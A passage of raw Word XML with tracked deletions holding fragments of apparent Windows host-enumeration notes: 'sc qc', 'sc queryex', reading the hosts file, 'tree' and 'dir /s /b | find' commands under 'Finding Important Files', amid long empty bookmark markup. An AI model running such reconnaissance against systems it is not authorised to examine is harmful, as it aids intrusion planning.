            </w:del>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sc qc wuauserv (gives the start type, binary path, user, and other configuration items)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sc quer</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">y</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Used alone it will result in all services displayed, add a service name to the command to narrow it down</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sc queryex</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Extended information about all, or one service </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type %WINDIR%\System32\drivers\etc\hosts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 the contents of the Windows hosts file</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echo %COMSPEC%</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Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure.</w:delText>
              </w:r>
            </w:del>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c:\windows\system32\gathernetworkinfo.vbs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enumerates registry, firewall config, dns cache, etc.Included script with Windows 7, </w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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b w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:b w:val="0"/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:tab/>
          <w:tab/>
          <w:tab/>
          <w:tab/>
          <w:tab/>
          <w:tab/>
          <w:tab/>
          <w:tab/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000740">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z1f4fk915re1" w:id="257"/>
        <w:bookmarkEnd w:id="257"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Finding Important Files</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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7"/>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3"/>
        <w:gridCol w:w="7027"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="3253"/>
            <w:gridCol w:w="7027"/>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Description / Reason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tree C:\ /f /a &gt; C:\output_of_tree.txt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Prints a directory listing in ‘tree’ format. The /a makes the tree </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">printed</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> with ASCII characters instead of special ones and the /f displays file names as well as folders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dir /a</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Lists all files in a directory to include hidden and system files</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dir /b /s [Directory or Filename]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Lists files and directories to include sub-directories (/s) in ‘base’ format (/b)</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dir \ /s /b | find /I </w:delText>
              </w:r>
            </w:del>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ins w:author="Anonymous" w:id="25" w:date="2019-07-09T22:42:26Z"/>
                <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:smallCaps w:val="0"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:ins w:author="Anonymous" w:id="25" w:date="2019-07-09T22:42:26Z">
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
                <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                  <w:rPr>
                    <w:rtl w:val="0"/>
                  </w:rPr>
                </w:r>
              </w:del>
            </w:ins>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“searchstring”</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Searches the output of dir from the root of the drive current drive (\) and all sub drectories (/s) using the ‘base’ format (/b) so that it outputs the full path for each listing, for ‘searchstring’ anywhere in the file name or path.</w:delText>
              </w:r>
            </w:del>
            <w:ins w:author="Anonymous" w:id="26" w:date="2019-07-29T12:32:22Z">
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
                <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                    <w:u w:val="single"/>
                    <w:rtl w:val="0"/>
                    <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                      <w:rPr>
                        <w:smallCaps w:val="0"/>
                      </w:rPr>
                    </w:rPrChange>
                  </w:rPr>
                  <w:delText xml:space="preserve">s</w:delText>
                </w:r>
              </w:del>
            </w:ins>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command | find /c /v “”</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Counts the lines of whatever you use for ‘command’</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bl>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79D">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Files</w:delText>
        </w:r>
      </w:del>
      <w:ins w:author="Anonymous" w:id="27" w:date="2019-07-09T22:42:56Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_ufpocum8urv" w:id="258"/>
          <w:bookmarkEnd w:id="258"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000079E">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bdo3yz2iw4eq" w:id="259"/>
          <w:bookmarkEnd w:id="259"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000079F">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w1vnhcgc8vev" w:id="260"/>
          <w:bookmarkEnd w:id="260"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A0">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ml5ocs4of70f" w:id="261"/>
          <w:bookmarkEnd w:id="261"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A1">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p0u019uet8x9" w:id="262"/>
          <w:bookmarkEnd w:id="262"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A2">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4a9pxga4q0of" w:id="263"/>
          <w:bookmarkEnd w:id="263"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A3">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rzqxgmslp776" w:id="264"/>
          <w:bookmarkEnd w:id="264"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A4">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cv6qqyha0f0" w:id="265"/>
          <w:bookmarkEnd w:id="265"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A5">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5tuwax2ltwj8" w:id="266"/>
          <w:bookmarkEnd w:id="266"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A6">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gs9p4prgf5f8" w:id="267"/>
          <w:bookmarkEnd w:id="267"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A7">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m4e2cvqq2p1q" w:id="268"/>
          <w:bookmarkEnd w:id="268"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A8">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eo360ei3g40b" w:id="269"/>
          <w:bookmarkEnd w:id="269"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007A9">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vqnmfaud21dg" w:id="270"/>
          <w:bookmarkEnd w:id="270"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007AA">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ykap2nvvr117" w:id="271"/>
          <w:bookmarkEnd w:id="271"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007AB">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6yy5x3srr0mm" w:id="272"/>
          <w:bookmarkEnd w:id="272"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007AC">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rnmhxufc5czm" w:id="273"/>
          <w:bookmarkEnd w:id="273"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007AD">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8" w:date="2019-09-30T12:48:18Z"/>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:smallCaps w:val="0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="Anonymous" w:id="28" w:date="2019-09-30T12:48:18Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_eiwbsscmcsx2" w:id="274"/>
          <w:bookmarkEnd w:id="274"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007AE">
      <w:pPr>
        <w:rPr>
          <w:ins w:author="Anonymous" w:id="27" w:date="2019-07-09T22:42:56Z"/>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:smallCaps w:val="0"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:smallCaps w:val="0"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-09-30T12:48:18Z">
          <w:pPr>
            <w:pStyle w:val="Heading2"/>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:author="Anonymous" w:id="28" w:date="2019-09-30T12:48:18Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:smallCaps w:val="0"/>
              <w:u w:val="single"/>
              <w:rtl w:val="0"/>
              <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText xml:space="preserve">apt in</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:author="Anonymous" w:id="27" w:date="2019-07-09T22:42:56Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_eiwbsscmcsx2" w:id="274"/>
          <w:bookmarkEnd w:id="274"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007AF">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gaarx83hkgm3" w:id="275"/>
          <w:bookmarkEnd w:id="275"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B0">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udsl2rg6kg4v" w:id="276"/>
          <w:bookmarkEnd w:id="276"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B1">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qo2tr4t5pdjl" w:id="277"/>
          <w:bookmarkEnd w:id="277"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B2">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s4vkbxb75wh9" w:id="278"/>
          <w:bookmarkEnd w:id="278"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B3">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f9tqm6nao0cy" w:id="279"/>
          <w:bookmarkEnd w:id="279"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B4">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hw6uyqndtphq" w:id="280"/>
          <w:bookmarkEnd w:id="280"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B5">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crcry9jr5ie" w:id="281"/>
          <w:bookmarkEnd w:id="281"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B6">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7lfcq6t4yetf" w:id="282"/>
          <w:bookmarkEnd w:id="282"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B7">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2fod7xktwsmo" w:id="283"/>
          <w:bookmarkEnd w:id="283"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B8">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t0455p1ujnj0" w:id="284"/>
          <w:bookmarkEnd w:id="284"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007B9">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f8414fp2jt4" w:id="285"/>
          <w:bookmarkEnd w:id="285"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007BA">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x853k4ez92e2" w:id="286"/>
          <w:bookmarkEnd w:id="286"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007BB">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hnfa5u9vi2rd" w:id="287"/>
          <w:bookmarkEnd w:id="287"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007BC">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pgc5el42wdax" w:id="288"/>
          <w:bookmarkEnd w:id="288"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007BD">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nheckvv09eny" w:id="289"/>
          <w:bookmarkEnd w:id="289"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007BE">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ym2jtqjquov" w:id="290"/>
          <w:bookmarkEnd w:id="290"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007BF">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e5ppmdodusvt" w:id="291"/>
          <w:bookmarkEnd w:id="291"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C0">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5cxi8rsfd25j" w:id="292"/>
          <w:bookmarkEnd w:id="292"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C1">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s2mg50mrwqif" w:id="293"/>
          <w:bookmarkEnd w:id="293"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C2">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t1u77oy4lh7n" w:id="294"/>
          <w:bookmarkEnd w:id="294"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C3">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wz3fcp5omq4h" w:id="295"/>
          <w:bookmarkEnd w:id="295"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C4">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l7iamrdbhyq9" w:id="296"/>
          <w:bookmarkEnd w:id="296"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C5">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s96f80lm5miu" w:id="297"/>
          <w:bookmarkEnd w:id="297"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C6">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ruu1np64byew" w:id="298"/>
          <w:bookmarkEnd w:id="298"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C7">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w41hh5qlsn3v" w:id="299"/>
          <w:bookmarkEnd w:id="299"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C8">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qljfnykqm1e0" w:id="300"/>
          <w:bookmarkEnd w:id="300"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007C9">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ql6jkprvfq1d" w:id="301"/>
          <w:bookmarkEnd w:id="301"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000007CA">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qrbw6m0gb0h" w:id="302"/>
          <w:bookmarkEnd w:id="302"/>
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
